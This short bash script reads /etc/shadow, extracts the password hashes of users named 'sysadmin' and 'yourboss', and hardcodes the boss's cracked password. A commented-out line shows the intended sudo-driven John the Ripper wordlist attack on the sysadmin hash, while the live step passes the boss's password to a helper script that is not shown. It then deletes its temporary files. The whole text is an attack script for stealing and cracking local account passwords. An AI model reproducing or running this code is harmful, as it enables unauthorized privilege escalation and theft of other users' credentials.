#!/usr/bin/env bash

 temp_password="correctbatteryhorsestaple99"

# Parse the shadow password file
 while IFS= read -r line; do
	if [ "${line:0:8}" = "sysadmin" ]; then
		sysadmin_hash=$line
	elif [ "${line:0:8}" = "yourboss" ]; then 
		yourboss_hash=$line
	fi
 done < /etc/shadow

# Crack the boss' password using custom method
# TODO: replaced yourboss_cracked with actual password for testing
# ./crack_password.py "$yourboss_hash" > temp.txt
 yourboss_cracked="money"
# $(<temp.txt)
# echo $yourboss_cracked

# Format sysadmin's password hash
 ./format_password.py "$sysadmin_hash" > temp_hash.txt

 ./auth.sh crack_sysadmin.sh $yourboss_cracked
#./auth.sh "su yourboss -c \"echo $yourboss_cracked | sudo -S john --wordlist=/usr/share/dict/american-english-small temp_hash.txt > out.txt\"" $yourboss_cracked

# Cleanup 
 rm temp.txt
 rm temp_hash.txt

